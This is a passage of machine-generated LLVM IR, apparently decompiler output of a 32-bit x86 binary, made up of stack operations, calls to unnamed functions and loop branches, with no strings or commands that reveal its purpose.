  %v3_804e21b = inttoptr i32 %v2_804e21b to i32*
  store i32 %v0_804e21b, i32* %v3_804e21b, align 4
  %v1_804e21c = add i32 %v0_804e1f6, 4
  %v2_804e21c = inttoptr i32 %v1_804e21c to i32*
  store i32 0, i32* %v2_804e21c, align 4
  %v2_804e21e = inttoptr i32 %v0_804e1f6 to i32*
  store i32 6, i32* %v2_804e21e, align 4
  %v3_804e220 = call i32 @function_8051c20(i32 0, i32* nonnull @0)
  store i32 %v3_804e220, i32* %eax.global-to-local, align 4
  %v0_804e225 = load i32, i32* @esp, align 4
  %v1_804e225 = inttoptr i32 %v0_804e225 to i32*
  %v3_804e225 = add i32 %v0_804e225, 4
  %v1_804e226 = inttoptr i32 %v3_804e225 to i32*
  store i32 %v3_804e220, i32* %v1_804e226, align 4
  %v1_804e228 = add i32 %v0_804e225, 4139
  store i32 %v1_804e228, i32* %eax.global-to-local, align 4
  store i32 %v1_804e228, i32* %v1_804e225, align 4
  %v3_804e230 = call i32 @function_8052640(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e230, i32* %eax.global-to-local, align 4
  %v0_804e235 = load i32, i32* @esp, align 4
  %v1_804e235 = inttoptr i32 %v0_804e235 to i32*
  %v2_804e235 = load i32, i32* %v1_804e235, align 4
  store i32 %v2_804e235, i32* @ebx, align 4
  %v1_804e236 = add i32 %v0_804e235, 4139
  store i32 %v1_804e236, i32* %edx.global-to-local, align 4
  store i32 %v1_804e236, i32* %v1_804e235, align 4
  %v2_804e23e = call i32 @function_8052620(i8* null)
  store i32 %v2_804e23e, i32* %eax.global-to-local, align 4
  %v0_804e243 = load i32, i32* @esp, align 4
  %v1_804e243 = inttoptr i32 %v0_804e243 to i32*
  %v2_804e243 = load i32, i32* %v1_804e243, align 4
  store i32 %v2_804e243, i32* %edx.global-to-local, align 4
  %v3_804e243 = add i32 %v0_804e243, 4
  %v1_804e244 = inttoptr i32 %v3_804e243 to i32*
  %v0_804e245 = load i32, i32* @edi, align 4
  store i32 %v0_804e245, i32* %v1_804e244, align 4
  %v1_804e246 = add i32 %v0_804e243, 4139
  store i32 %v1_804e246, i32* %edx.global-to-local, align 4
  %v2_804e24d = add i32 %v1_804e246, %v2_804e23e
  store i32 %v2_804e24d, i32* %eax.global-to-local, align 4
  store i32 %v2_804e24d, i32* %v1_804e243, align 4
  %v3_804e251 = call i32 @function_8052640(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e251, i32* %eax.global-to-local, align 4
  %v0_804e256 = load i32, i32* @esp, align 4
  %v1_804e256 = inttoptr i32 %v0_804e256 to i32*
  %v2_804e256 = load i32, i32* %v1_804e256, align 4
  store i32 %v2_804e256, i32* @ebp, align 4
  %v3_804e256 = add i32 %v0_804e256, 4
  %v1_804e257 = inttoptr i32 %v3_804e256 to i32*
  %v2_804e257 = load i32, i32* %v1_804e257, align 4
  store i32 %v2_804e257, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804e257, align 4
  store i32 7, i32* %v1_804e256, align 4
  %v3_804e25c = call i32 @function_8051c20(i32 0, i32* nonnull @0)
  store i32 %v3_804e25c, i32* %eax.global-to-local, align 4
  %v0_804e261 = load i32, i32* @esp, align 4
  %v1_804e261 = inttoptr i32 %v0_804e261 to i32*
  %v2_804e261 = load i32, i32* %v1_804e261, align 4
  store i32 %v2_804e261, i32* @esi, align 4
  store i32 %v3_804e25c, i32* @ebx, align 4
  %v1_804e264 = add i32 %v0_804e261, 4139
  store i32 %v1_804e264, i32* %eax.global-to-local, align 4
  store i32 %v1_804e264, i32* %v1_804e261, align 4
  %v2_804e26c = call i32 @function_8052620(i8* null)
  store i32 %v2_804e26c, i32* %eax.global-to-local, align 4
  %v0_804e271 = load i32, i32* @esp, align 4
  %v1_804e271 = inttoptr i32 %v0_804e271 to i32*
  %v2_804e271 = load i32, i32* %v1_804e271, align 4
  store i32 %v2_804e271, i32* %edx.global-to-local, align 4
  %v3_804e271 = add i32 %v0_804e271, 4
  %v1_804e272 = inttoptr i32 %v3_804e271 to i32*
  %v0_804e273 = load i32, i32* @ebx, align 4
  store i32 %v0_804e273, i32* %v1_804e272, align 4
  %v1_804e274 = add i32 %v0_804e271, 4139
  store i32 %v1_804e274, i32* %edx.global-to-local, align 4
  %v2_804e27b = add i32 %v1_804e274, %v2_804e26c
  store i32 %v2_804e27b, i32* %eax.global-to-local, align 4
  store i32 %v2_804e27b, i32* %v1_804e271, align 4
  %v3_804e27f = call i32 @function_8052640(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804e284 = load i32, i32* @esp, align 4
  %v1_804e287 = add i32 %v0_804e284, 8
  %v2_804e287 = inttoptr i32 %v1_804e287 to i32*
  store i32 4096, i32* %v2_804e287, align 4
  %v1_804e28c = add i32 %v0_804e284, 43
  store i32 %v1_804e28c, i32* %eax.global-to-local, align 4
  %v2_804e290 = add i32 %v0_804e284, 4
  %v3_804e290 = inttoptr i32 %v2_804e290 to i32*
  store i32 %v1_804e28c, i32* %v3_804e290, align 4
  %v1_804e291 = add i32 %v0_804e284, 4139
  store i32 %v1_804e291, i32* %edx.global-to-local, align 4
  %v3_804e298 = inttoptr i32 %v0_804e284 to i32*
  store i32 %v1_804e291, i32* %v3_804e298, align 4
  %v4_804e299 = call i32 @function_8052d92(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804e29e = load i32, i32* @esp, align 4
  %v1_804e29e = add i32 %v0_804e29e, 16
  %v1_804e2a1 = add i32 %v4_804e299, 1
  %v8_804e2a1 = icmp eq i32 %v1_804e2a1, 0
  store i32 %v1_804e2a1, i32* %eax.global-to-local, align 4
  br i1 %v8_804e2a1, label %dec_label_pc_804e1e9, label %dec_label_pc_804e2a8

dec_label_pc_804e2a8:                             ; preds = %dec_label_pc_804e21a
  %v2_804e2a8 = add i32 %v0_804e29e, 12
  %v3_804e2a8 = inttoptr i32 %v2_804e2a8 to i32*
  store i32 %v1_804e2a1, i32* %v3_804e2a8, align 4
  %v0_804e2a9 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e2a9 = add i32 %v0_804e29e, 8
  %v3_804e2a9 = inttoptr i32 %v2_804e2a9 to i32*
  store i32 %v0_804e2a9, i32* %v3_804e2a9, align 4
  %v1_804e2aa = add i32 %v0_804e29e, 4
  %v2_804e2aa = inttoptr i32 %v1_804e2aa to i32*
  store i32 0, i32* %v2_804e2aa, align 4
  %v2_804e2ac = inttoptr i32 %v0_804e29e to i32*
  store i32 6, i32* %v2_804e2ac, align 4
  %v3_804e2ae = call i32 @function_8051c20(i32 0, i32* nonnull @0)
  store i32 %v3_804e2ae, i32* %eax.global-to-local, align 4
  %v0_804e2b3 = load i32, i32* @esp, align 4
  %v1_804e2b3 = inttoptr i32 %v0_804e2b3 to i32*
  %v3_804e2b3 = add i32 %v0_804e2b3, 4
  %v1_804e2b4 = inttoptr i32 %v3_804e2b3 to i32*
  store i32 %v3_804e2ae, i32* %v1_804e2b4, align 4
  %v1_804e2b6 = add i32 %v0_804e2b3, 4139
  store i32 %v1_804e2b6, i32* %eax.global-to-local, align 4
  store i32 %v1_804e2b6, i32* %v1_804e2b3, align 4
  %v3_804e2be = call i32 @function_8052640(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e2be, i32* %eax.global-to-local, align 4
  %v0_804e2c3 = load i32, i32* @esp, align 4
  %v1_804e2c3 = inttoptr i32 %v0_804e2c3 to i32*
  %v2_804e2c3 = load i32, i32* %v1_804e2c3, align 4
  store i32 %v2_804e2c3, i32* @ebx, align 4
  %v1_804e2c4 = add i32 %v0_804e2c3, 4139
  store i32 %v1_804e2c4, i32* %edx.global-to-local, align 4
  store i32 %v1_804e2c4, i32* %v1_804e2c3, align 4
  %v2_804e2cc = call i32 @function_8052620(i8* null)
  store i32 %v2_804e2cc, i32* %eax.global-to-local, align 4
  %v0_804e2d1 = load i32, i32* @esp, align 4
  %v1_804e2d1 = inttoptr i32 %v0_804e2d1 to i32*
  %v2_804e2d1 = load i32, i32* %v1_804e2d1, align 4
  store i32 %v2_804e2d1, i32* %edx.global-to-local, align 4
  %v3_804e2d1 = add i32 %v0_804e2d1, 4
  %v1_804e2d2 = inttoptr i32 %v3_804e2d1 to i32*
  %v0_804e2d3 = load i32, i32* @edi, align 4
  store i32 %v0_804e2d3, i32* %v1_804e2d2, align 4
  %v1_804e2d4 = add i32 %v0_804e2d1, 4139
  store i32 %v1_804e2d4, i32* %edx.global-to-local, align 4
  %v2_804e2db = add i32 %v1_804e2d4, %v2_804e2cc
  store i32 %v2_804e2db, i32* %eax.global-to-local, align 4
  store i32 %v2_804e2db, i32* %v1_804e2d1, align 4
  %v3_804e2df = call i32 @function_8052640(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e2df, i32* %eax.global-to-local, align 4
  %v0_804e2e4 = load i32, i32* @esp, align 4
  %v1_804e2e4 = inttoptr i32 %v0_804e2e4 to i32*
  %v2_804e2e4 = load i32, i32* %v1_804e2e4, align 4
  store i32 %v2_804e2e4, i32* @ebp, align 4
  %v3_804e2e4 = add i32 %v0_804e2e4, 4
  %v1_804e2e5 = inttoptr i32 %v3_804e2e4 to i32*
  %v2_804e2e5 = load i32, i32* %v1_804e2e5, align 4
  store i32 %v2_804e2e5, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804e2e5, align 4
  store i32 9, i32* %v1_804e2e4, align 4
  %v3_804e2ea = call i32 @function_8051c20(i32 0, i32* nonnull @0)
  store i32 %v3_804e2ea, i32* %eax.global-to-local, align 4
  %v0_804e2ef = load i32, i32* @esp, align 4
  %v1_804e2ef = inttoptr i32 %v0_804e2ef to i32*
  %v2_804e2ef = load i32, i32* %v1_804e2ef, align 4
  store i32 %v2_804e2ef, i32* @esi, align 4
  store i32 %v3_804e2ea, i32* @ebx, align 4
  %v1_804e2f2 = add i32 %v0_804e2ef, 4139
  store i32 %v1_804e2f2, i32* %eax.global-to-local, align 4
  store i32 %v1_804e2f2, i32* %v1_804e2ef, align 4
  %v2_804e2fa = call i32 @function_8052620(i8* null)
  store i32 %v2_804e2fa, i32* %eax.global-to-local, align 4
  %v0_804e2ff = load i32, i32* @esp, align 4
  %v1_804e2ff = inttoptr i32 %v0_804e2ff to i32*
  %v2_804e2ff = load i32, i32* %v1_804e2ff, align 4
  store i32 %v2_804e2ff, i32* %edx.global-to-local, align 4
  %v3_804e2ff = add i32 %v0_804e2ff, 4
  %v1_804e300 = inttoptr i32 %v3_804e2ff to i32*
  %v0_804e301 = load i32, i32* @ebx, align 4
  store i32 %v0_804e301, i32* %v1_804e300, align 4
  %v1_804e302 = add i32 %v0_804e2ff, 4139
  store i32 %v1_804e302, i32* %edx.global-to-local, align 4
  %v2_804e309 = add i32 %v1_804e302, %v2_804e2fa
  store i32 %v2_804e309, i32* %eax.global-to-local, align 4
  store i32 %v2_804e309, i32* %v1_804e2ff, align 4
  %v3_804e30d = call i32 @function_8052640(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804e312 = load i32, i32* @esp, align 4
  %v1_804e312 = inttoptr i32 %v0_804e312 to i32*
  %v1_804e313 = add i32 %v0_804e312, 4139
  store i32 %v1_804e313, i32* %eax.global-to-local, align 4
  store i32 %v1_804e313, i32* %v1_804e312, align 4
  %v1_804e31b = call i32 @function_8052f84(i32 0)
  store i32 %v1_804e31b, i32* %eax.global-to-local, align 4
  %v0_804e320 = load i32, i32* @esp, align 4
  %v1_804e320 = add i32 %v0_804e320, 16
  store i32 %v1_804e31b, i32* @ebp, align 4
  %v1_804e325 = icmp eq i32 %v1_804e31b, 0
  br i1 %v1_804e325, label %dec_label_pc_804e1e9, label %dec_label_pc_804e32d.preheader

dec_label_pc_804e32d.preheader:                   ; preds = %dec_label_pc_804e2a8
  %v3_804e33083 = inttoptr i32 %v0_804e320 to i32*
  store i32 %v1_804e31b, i32* %v3_804e33083, align 4
  %v0_804e33184 = call i32 @function_8053075()
  store i32 %v0_804e33184, i32* @eax, align 4
  %v0_804e33685 = load i32, i32* @esp, align 4
  store i32 %v0_804e33184, i32* @esi, align 4
  %v1_804e33b87 = icmp eq i32 %v0_804e33184, 0
  br i1 %v1_804e33b87, label %dec_label_pc_804e57e, label %dec_label_pc_804e343

dec_label_pc_804e343:                             ; preds = %dec_label_pc_804e32d.preheader, %dec_label_pc_804e32d.backedge
  %v0_804e33688 = phi i32 [ %v0_804e336, %dec_label_pc_804e32d.backedge ], [ %v0_804e33685, %dec_label_pc_804e32d.preheader ]
  %v1_804e343 = add i32 %v0_804e33688, 20
  %v2_804e343 = inttoptr i32 %v1_804e343 to i32*
  %v3_804e343 = load i32, i32* %v2_804e343, align 4
  store i32 %v3_804e343, i32* @eax, align 4
  %v1_804e347 = icmp eq i32 %v3_804e343, 0
  %v1_804e349 = icmp eq i1 %v1_804e347, false
  br i1 %v1_804e349, label %dec_label_pc_804e57e, label %dec_label_pc_804e34f

dec_label_pc_804e34f:                             ; preds = %dec_label_pc_804e343
  %v2_804e34f = add i32 %v0_804e33688, 12
  %v3_804e34f = inttoptr i32 %v2_804e34f to i32*
  store i32 %v3_804e343, i32* %v3_804e34f, align 4
  %v2_804e350 = add i32 %v0_804e33688, 8
  %v3_804e350 = inttoptr i32 %v2_804e350 to i32*
  store i32 %v3_804e343, i32* %v3_804e350, align 4
  %v1_804e351 = add i32 %v0_804e33688, 4
  %v2_804e351 = inttoptr i32 %v1_804e351 to i32*
  store i32 4096, i32* %v2_804e351, align 4
  %v1_804e356 = add i32 %v0_804e33688, 43
  store i32 %v1_804e356, i32* %edx.global-to-local, align 4
  %v3_804e35a = inttoptr i32 %v0_804e33688 to i32*
  store i32 %v1_804e356, i32* %v3_804e35a, align 4
  %v2_804e35b = call i32 @function_80526b0(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804e35b, i32* %eax.global-to-local, align 4
  %v0_804e360 = load i32, i32* @esp, align 4
  %v1_804e360 = inttoptr i32 %v0_804e360 to i32*
  %v2_804e360 = load i32, i32* %v1_804e360, align 4
  store i32 %v2_804e360, i32* @ebx, align 4
  %v3_804e360 = add i32 %v0_804e360, 4
  %v1_804e361 = inttoptr i32 %v3_804e360 to i32*
  %v2_804e361 = load i32, i32* %v1_804e361, align 4
  store i32 %v2_804e361, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804e361, align 4
  store i32 6, i32* %v1_804e360, align 4
  %v3_804e366 = call i32 @function_8051c20(i32 0, i32* nonnull @0)
  store i32 %v3_804e366, i32* %eax.global-to-local, align 4
  %v0_804e36b = load i32, i32* @esp, align 4
  %v1_804e36b = inttoptr i32 %v0_804e36b to i32*
  %v2_804e36b = load i32, i32* %v1_804e36b, align 4
  store i32 %v2_804e36b, i32* %edx.global-to-local, align 4
  %v3_804e36b = add i32 %v0_804e36b, 4
  %v1_804e36c = inttoptr i32 %v3_804e36b to i32*
  store i32 %v3_804e366, i32* %v1_804e36c, align 4
  %v1_804e36e = add i32 %v0_804e36b, 4139
  store i32 %v1_804e36e, i32* %eax.global-to-local, align 4
  store i32 %v1_804e36e, i32* %v1_804e36b, align 4
  %v3_804e376 = call i32 @function_8052640(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e376, i32* %eax.global-to-local, align 4
  %v0_804e37b = load i32, i32* @esp, align 4
  %v1_804e37b = inttoptr i32 %v0_804e37b to i32*
  %v2_804e37b = load i32, i32* %v1_804e37b, align 4
  store i32 %v2_804e37b, i32* %eax.global-to-local, align 4
  %v1_804e37c = add i32 %v0_804e37b, 4139
  store i32 %v1_804e37c, i32* %edx.global-to-local, align 4
  store i32 %v1_804e37c, i32* %v1_804e37b, align 4
  %v2_804e384 = call i32 @function_8052620(i8* null)
  store i32 %v2_804e384, i32* %eax.global-to-local, align 4
  %v0_804e389 = load i32, i32* @esp, align 4
  %v1_804e389 = inttoptr i32 %v0_804e389 to i32*
  %v3_804e389 = add i32 %v0_804e389, 4
  %v1_804e38a = inttoptr i32 %v3_804e389 to i32*
  %v2_804e38a = load i32, i32* %v1_804e38a, align 4
  store i32 %v2_804e38a, i32* @ebx, align 4
  %v0_804e38b = load i32, i32* @edi, align 4
  store i32 %v0_804e38b, i32* %v1_804e38a, align 4
  %v1_804e38c = add i32 %v0_804e389, 4139
  store i32 %v1_804e38c, i32* %edx.global-to-local, align 4
  %v2_804e393 = add i32 %v1_804e38c, %v2_804e384
  store i32 %v2_804e393, i32* %eax.global-to-local, align 4
  store i32 %v2_804e393, i32* %v1_804e389, align 4
  %v3_804e397 = call i32 @function_8052640(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e397, i32* %eax.global-to-local, align 4
  %v0_804e39c = load i32, i32* @esp, align 4
  %v1_804e39c = inttoptr i32 %v0_804e39c to i32*
  %v2_804e39c = load i32, i32* %v1_804e39c, align 4
  store i32 %v2_804e39c, i32* %eax.global-to-local, align 4
  %v3_804e39c = add i32 %v0_804e39c, 4
  %v1_804e39d = inttoptr i32 %v3_804e39c to i32*
  %v2_804e39d = load i32, i32* %v1_804e39d, align 4
  store i32 %v2_804e39d, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_804e39d, align 4
  store i32 9, i32* %v1_804e39c, align 4
  %v3_804e3a2 = call i32 @function_8051c20(i32 0, i32* nonnull @0)
  store i32 %v3_804e3a2, i32* @ebx, align 4
  %v0_804e3a9 = load i32, i32* @esp, align 4
  %v1_804e3a9 = inttoptr i32 %v0_804e3a9 to i32*
  %v1_804e3aa = add i32 %v0_804e3a9, 4139
  store i32 %v1_804e3aa, i32* %eax.global-to-local, align 4
  store i32 %v1_804e3aa, i32* %v1_804e3a9, align 4
  %v2_804e3b2 = call i32 @function_8052620(i8* null)
  store i32 %v2_804e3b2, i32* %eax.global-to-local, align 4
  %v0_804e3b7 = load i32, i32* @esp, align 4
  %v1_804e3b7 = inttoptr i32 %v0_804e3b7 to i32*
  %v2_804e3b7 = load i32, i32* %v1_804e3b7, align 4
  store i32 %v2_804e3b7, i32* %edx.global-to-local, align 4
  %v3_804e3b7 = add i32 %v0_804e3b7, 4
  %v1_804e3b8 = inttoptr i32 %v3_804e3b7 to i32*
  %v0_804e3b9 = load i32, i32* @ebx, align 4
  store i32 %v0_804e3b9, i32* %v1_804e3b8, align 4
  %v1_804e3ba = add i32 %v0_804e3b7, 4139
  store i32 %v1_804e3ba, i32* %edx.global-to-local, align 4
  %v2_804e3c1 = add i32 %v1_804e3ba, %v2_804e3b2
  store i32 %v2_804e3c1, i32* %eax.global-to-local, align 4
  store i32 %v2_804e3c1, i32* %v1_804e3b7, align 4
  %v3_804e3c5 = call i32 @function_8052640(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e3c5, i32* %eax.global-to-local, align 4
  %v0_804e3ca = load i32, i32* @esp, align 4
  %v1_804e3ca = inttoptr i32 %v0_804e3ca to i32*
  %v2_804e3ca = load i32, i32* %v1_804e3ca, align 4
  store i32 %v2_804e3ca, i32* @ebx, align 4
  %v1_804e3cb = add i32 %v0_804e3ca, 4139
  store i32 %v1_804e3cb, i32* %eax.global-to-local, align 4
  store i32 %v1_804e3cb, i32* %v1_804e3ca, align 4
  %v2_804e3d3 = call i32 @function_8052620(i8* null)
  store i32 %v2_804e3d3, i32* %eax.global-to-local, align 4
  %v0_804e3d8 = load i32, i32* @esp, align 4
  %v1_804e3d8 = inttoptr i32 %v0_804e3d8 to i32*
  %v2_804e3d8 = load i32, i32* %v1_804e3d8, align 4
  store i32 %v2_804e3d8, i32* %edx.global-to-local, align 4
  %v3_804e3d8 = add i32 %v0_804e3d8, 4
  %v1_804e3d9 = inttoptr i32 %v3_804e3d8 to i32*
  store i32 ptrtoint (i32* @global_var_80554ad.6 to i32), i32* %v1_804e3d9, align 4
  %v1_804e3df = add i32 %v0_804e3d8, 4139
  store i32 %v1_804e3df, i32* %edx.global-to-local, align 4
  %v2_804e3e6 = add i32 %v1_804e3df, %v2_804e3d3
  store i32 %v2_804e3e6, i32* %eax.global-to-local, align 4
  store i32 %v2_804e3e6, i32* %v1_804e3d8, align 4
  %v3_804e3ea = call i32 @function_8052640(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e3ea, i32* %eax.global-to-local, align 4
  %v0_804e3ef = load i32, i32* @esp, align 4
  %v1_804e3ef = inttoptr i32 %v0_804e3ef to i32*
  %v2_804e3ef = load i32, i32* %v1_804e3ef, align 4
  store i32 %v2_804e3ef, i32* @ebx, align 4
  %v1_804e3f0 = add i32 %v0_804e3ef, 4139
  store i32 %v1_804e3f0, i32* %eax.global-to-local, align 4
  store i32 %v1_804e3f0, i32* %v1_804e3ef, align 4
  %v2_804e3f8 = call i32 @function_8052620(i8* null)
  store i32 %v2_804e3f8, i32* %eax.global-to-local, align 4
  %v0_804e3fd = load i32, i32* @esp, align 4
  %v1_804e3fd = inttoptr i32 %v0_804e3fd to i32*
  %v3_804e3fd = add i32 %v0_804e3fd, 4
  %v0_804e3fe = load i32, i32* @esi, align 4
  %v1_804e3fe = add i32 %v0_804e3fe, 11
  store i32 %v1_804e3fe, i32* %edx.global-to-local, align 4
  %v1_804e401 = inttoptr i32 %v3_804e3fd to i32*
  store i32 %v1_804e3fe, i32* %v1_804e401, align 4
  %v1_804e403 = add i32 %v0_804e3fd, 4139
  store i32 %v1_804e403, i32* %edx.global-to-local, align 4
  %v2_804e40a = add i32 %v1_804e403, %v2_804e3f8
  store i32 %v2_804e40a, i32* %eax.global-to-local, align 4
  store i32 %v2_804e40a, i32* %v1_804e3fd, align 4
  %v3_804e40e = call i32 @function_8052640(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804e413 = load i32, i32* @esp, align 4
  %v1_804e416 = add i32 %v0_804e413, 8
  %v2_804e416 = inttoptr i32 %v1_804e416 to i32*
  store i32 4096, i32* %v2_804e416, align 4
  %v1_804e41b = add i32 %v0_804e413, 43
  store i32 %v1_804e41b, i32* %eax.global-to-local, align 4
  %v2_804e41f = add i32 %v0_804e413, 4
  %v3_804e41f = inttoptr i32 %v2_804e41f to i32*
  store i32 %v1_804e41b, i32* %v3_804e41f, align 4
  %v1_804e420 = add i32 %v0_804e413, 4139
  store i32 %v1_804e420, i32* %edx.global-to-local, align 4
  %v3_804e427 = inttoptr i32 %v0_804e413 to i32*
  store i32 %v1_804e420, i32* %v3_804e427, align 4
  %v4_804e428 = call i32 @function_8052d92(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804e42d = load i32, i32* @esp, align 4
  %v1_804e430 = add i32 %v4_804e428, 1
  %v8_804e430 = icmp eq i32 %v1_804e430, 0
  store i32 %v1_804e430, i32* %eax.global-to-local, align 4
  br i1 %v8_804e430, label %dec_label_pc_804e32d.backedge, label %dec_label_pc_804e437

dec_label_pc_804e437:                             ; preds = %dec_label_pc_804e34f
  %v1_804e43a = add i32 %v0_804e42d, 43
  store i32 %v1_804e43a, i32* %eax.global-to-local, align 4
  %v3_804e43e = inttoptr i32 %v0_804e42d to i32*
  store i32 %v1_804e43a, i32* %v3_804e43e, align 4
  %v2_804e43f = call i32 @function_8052620(i8* null)
  %v0_804e444 = load i32, i32* @esp, align 4
  %v1_804e447 = add i32 %v0_804e444, 8764
  store i32 %v1_804e447, i32* @edx, align 4
  %v2_804e44e = add i32 %v0_804e444, 8
  %v3_804e44e = inttoptr i32 %v2_804e44e to i32*
  store i32 %v1_804e447, i32* %v3_804e44e, align 4
  %v2_804e44f = add i32 %v0_804e444, 4
  %v3_804e44f = inttoptr i32 %v2_804e44f to i32*
  store i32 %v2_804e43f, i32* %v3_804e44f, align 4
  %v1_804e450 = add i32 %v0_804e444, 43
  store i32 %v1_804e450, i32* %eax.global-to-local, align 4
  %v3_804e454 = inttoptr i32 %v0_804e444 to i32*
  store i32 %v1_804e450, i32* %v3_804e454, align 4
  %v4_804e455 = call i32 @function_8052910(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804e45a = load i32, i32* @esp, align 4
  %v1_804e45d = add i32 %v4_804e455, 1
  %v8_804e45d = icmp eq i32 %v1_804e45d, 0
  store i32 %v1_804e45d, i32* %eax.global-to-local, align 4
  br i1 %v8_804e45d, label %dec_label_pc_804e32d.backedge, label %dec_label_pc_804e464

dec_label_pc_804e464:                             ; preds = %dec_label_pc_804e437
  %v0_804e464 = load i32, i32* @ebx, align 4
  %v2_804e464 = add i32 %v0_804e45a, 12
  %v3_804e464 = inttoptr i32 %v2_804e464 to i32*
  store i32 %v0_804e464, i32* %v3_804e464, align 4
  %v0_804e465 = load i32, i32* @ebx, align 4
  %v2_804e465 = add i32 %v0_804e45a, 8
  %v3_804e465 = inttoptr i32 %v2_804e465 to i32*
  store i32 %v0_804e465, i32* %v3_804e465, align 4
  %v1_804e466 = add i32 %v0_804e45a, 4
  %v2_804e466 = inttoptr i32 %v1_804e466 to i32*
  store i32 10, i32* %v2_804e466, align 4
  %v0_804e468 = load i32, i32* @edi, align 4
  %v3_804e468 = inttoptr i32 %v0_804e45a to i32*
  store i32 %v0_804e468, i32* %v3_804e468, align 4
  %v3_804e469 = call i32 @function_8052720(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e469, i32* %eax.global-to-local, align 4
  %v0_804e46e = load i32, i32* @esp, align 4
  %v1_804e46e = inttoptr i32 %v0_804e46e to i32*
  %v2_804e46e = load i32, i32* %v1_804e46e, align 4
  store i32 %v2_804e46e, i32* %edx.global-to-local, align 4
  %v3_804e46e = add i32 %v0_804e46e, 4
  %v1_804e46f = inttoptr i32 %v3_804e46e to i32*
  store i32 9, i32* %v1_804e46f, align 4
  store i32 %v3_804e469, i32* %v1_804e46e, align 4
  %v4_804e473 = call i32 @function_8052ca0(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e473, i32* %eax.global-to-local, align 4
  %v0_804e478 = load i32, i32* @esp, align 4
  %v1_804e478 = add i32 %v0_804e478, 20
  %v2_804e478 = inttoptr i32 %v1_804e478 to i32*
  store i32 1, i32* %v2_804e478, align 4
  %v0_804e480 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e32d.backedge

dec_label_pc_804e32d.backedge:                    ; preds = %dec_label_pc_804e464, %dec_label_pc_804e34f, %dec_label_pc_804e437
  %v0_804e32d42.in = phi i32 [ %v0_804e480, %dec_label_pc_804e464 ], [ %v0_804e42d, %dec_label_pc_804e34f ], [ %v0_804e45a, %dec_label_pc_804e437 ]
  %v0_804e330.pre = load i32, i32* @ebp, align 4
  %v3_804e330 = inttoptr i32 %v0_804e32d42.in to i32*
  store i32 %v0_804e330.pre, i32* %v3_804e330, align 4
  %v0_804e331 = call i32 @function_8053075()
  store i32 %v0_804e331, i32* @eax, align 4
  %v0_804e336 = load i32, i32* @esp, align 4
  store i32 %v0_804e331, i32* @esi, align 4
  %v1_804e33b = icmp eq i32 %v0_804e331, 0
  br i1 %v1_804e33b, label %dec_label_pc_804e57e, label %dec_label_pc_804e343

dec_label_pc_804e488:                             ; preds = %dec_label_pc_804e12b
  %v1_804e488 = add i32 %v0_804e488, 1
  store i32 %v1_804e488, i32* @esi, align 4
  %v9_804e489 = icmp eq i32 %v0_804e488, 0
  %v1_804e48c = icmp eq i1 %v9_804e489, false
  br i1 %v1_804e48c, label %dec_label_pc_804e133, label %dec_label_pc_804e492

dec_label_pc_804e492:                             ; preds = %dec_label_pc_804e488
  %v1_804e492 = add i32 %v0_804e135, 3
  %v2_804e492 = inttoptr i32 %v1_804e492 to i8*
  %v3_804e492 = load i8, i8* %v2_804e492, align 1
  %v12_804e492 = icmp eq i8 %v3_804e492, 65
  %.stack_var_-8769.1 = select i1 %v12_804e492, i8 1, i8 %stack_var_-8769.1.ph
  %v1_804e498 = add i32 %v0_804e135, 1
  store i32 %v1_804e498, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804e113.outer

dec_label_pc_804e4a0:                             ; preds = %dec_label_pc_804e123, %dec_label_pc_804e11b
  %v1_804e4a0 = and i32 %v0_804e4a0, -256
  %v2_804e4a0 = or i32 %v1_804e4a0, 1
  br label %dec_label_pc_804e135

dec_label_pc_804e4a7:                             ; preds = %dec_label_pc_804e08b, %dec_label_pc_804e07c
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e0a1

dec_label_pc_804e4b7:                             ; preds = %dec_label_pc_804e19b
  store i32 0, i32* @ebx, align 4
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v3_804e4be = call i32 @function_8051c50(i8 6)
  store i32 %v3_804e4be, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 7 to i8*), i8** %stack_var_-8796, align 4
  %v3_804e4ca = call i32 @function_8051c50(i8 7)
  store i32 %v3_804e4ca, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 9 to i8*), i8** %stack_var_-8796, align 4
  %v3_804e4d6 = call i32 @function_8051c50(i8 9)
  store i32 %v3_804e4d6, i32* %eax.global-to-local, align 4
  %v2_804e4e6.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804e4de

dec_label_pc_804e4de:                             ; preds = %dec_label_pc_804e024, %dec_label_pc_804e4b7
  %v2_804e4e6 = phi i32 [ %v0_804df73, %dec_label_pc_804e024 ], [ %v2_804e4e6.pre, %dec_label_pc_804e4b7 ]
  %v0_804e4e4 = load i32, i32* @ebx, align 4
  store i32 %v0_804e4e4, i32* %eax.global-to-local, align 4
